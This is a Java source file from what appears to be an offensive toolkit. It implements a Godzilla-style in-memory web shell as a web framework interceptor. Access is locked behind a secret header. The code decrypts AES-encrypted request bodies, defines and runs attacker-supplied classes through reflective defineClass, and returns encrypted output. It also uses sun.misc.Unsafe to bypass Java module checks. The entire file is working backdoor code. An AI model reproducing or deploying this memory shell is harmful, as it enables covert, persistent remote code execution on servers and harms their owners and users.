package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.MemShellType;
import sun.misc.Unsafe;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author Whoopsunix
 */
@MemShell(MemShell.Interceptor)
@MemShellFunction(MemShellFunction.Godzilla)
@MemShellType(MemShellType.Raw)
@JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class InterceptorGodzillaRaw implements InvocationHandler {
    public static String key; // key
    public static String pass;
    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public InterceptorGodzillaRaw() {
    }

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("preHandle")) {
            return run(args[0], args[1], args[2]);
        }
        return null;
    }

    private boolean run(Object request, Object response, Object handler) {
        try {
            addModule();
            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return true;
            }

            Class requestClass = null;
            try {
                requestClass = Class.forName("javax.servlet.ServletRequest");
            } catch (Exception e) {
                try {
                    requestClass = Class.forName("jakarta.servlet.ServletRequest");
                } catch (ClassNotFoundException ex) {

                }
            }
            Object session = invokeMethod(request, "getSession", new Class[]{}, new Object[]{});

            byte[] data = new byte[Integer.parseInt((String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Length"}))];
            InputStream inputStream = (InputStream) invokeMethod(requestClass, request, "getInputStream", new Class[]{}, new Object[]{});
            int bytesRead;
            int offset = 0;
            while (offset < data.length && (bytesRead = inputStream.read(data, offset, data.length - offset)) != -1) {
                offset += bytesRead;
            }
            inputStream.close();
            Object payload = invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});

            data = x(data, false);

            if (payload == null) {
                invokeMethod(session, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"payload", defClass(data)});
                return false;
            } else {
                invokeMethod(requestClass, request, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                Class cls = (Class) invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
                Object f = cls.newInstance();
                f.equals(arrOut);
                f.equals(request);
                f.toString();
                OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", new Class[]{}, new Object[]{});
                outputStream.write(x(arrOut.toByteArray(), true));
                return false;
            }
        } catch (Throwable e) {
        }
        return true;
    }

    public Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = InterceptorGodzillaRaw.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Exception e) {

        }
    }
}
